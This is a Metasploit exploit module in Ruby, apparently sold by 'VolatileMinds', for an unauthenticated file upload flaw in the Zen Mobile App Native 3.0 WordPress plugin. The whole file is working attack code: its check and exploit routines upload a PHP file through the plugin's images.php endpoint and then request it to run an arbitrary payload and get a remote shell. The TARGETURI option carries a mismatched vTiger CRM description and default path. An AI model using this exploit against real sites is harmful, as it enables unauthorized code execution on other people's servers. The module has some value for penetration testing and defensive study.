##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Wordpress Zen Mobile App Native RCE',
      'Description' => %q{This module exploits vulnerable instances in order to gain a remote shell.

    This module exploits an unauthenticated file upload vulnerability
    in the Zen Mobile App Native 3.0 Wordpress plugin.

    Categories: Wordpress, Code Execution

    Price: 2

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
          'VolatileMinds'
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
          ['URL', 'https://wpvulndb.com/vulnerabilities/8743']
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 28 2017'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base vTiger CRM directory path", '/vtigercrm/']),
      ], self.class)
  end

  def check
    data = Rex::MIME::Message.new
    flag = Rex::Text.rand_text_alpha(10)

    data.add_part('<?php echo "\x' + flag.unpack("H*")[0].scan(/../).join('\x') + '"; ?>', 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"#{Rex::Text.rand_text_alpha(10)}.php\"")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/wp-content/plugins/zen-mobile-app-native/server/images.php'),
      'data' => data.to_s,
      'ctype'   => "multipart/form-data; boundary=#{data.bound}"
    })

    name = $1 if res.body =~ /images\/(.*?).php/

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/wp-content/plugins/zen-mobile-app-native/server/images/'+name+'.php')
    })

    if res.body == flag
      return CheckCode::Vulnerable
    else
      return CheckCode::Safe
    end
  end

  def exploit

    data = Rex::MIME::Message.new
    data.add_part('<?php ' + payload.encoded + ' ?>', 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"#{Rex::Text.rand_text_alpha(10)}.php\"")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/wp-content/plugins/zen-mobile-app-native/server/images.php'),
      'data' => data.to_s,
      'ctype'   => "multipart/form-data; boundary=#{data.bound}"
    })

    name = $1 if res.body =~ /images\/(.*?).php/

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/wp-content/plugins/zen-mobile-app-native/server/images/'+name+'.php')
    })
  end
end
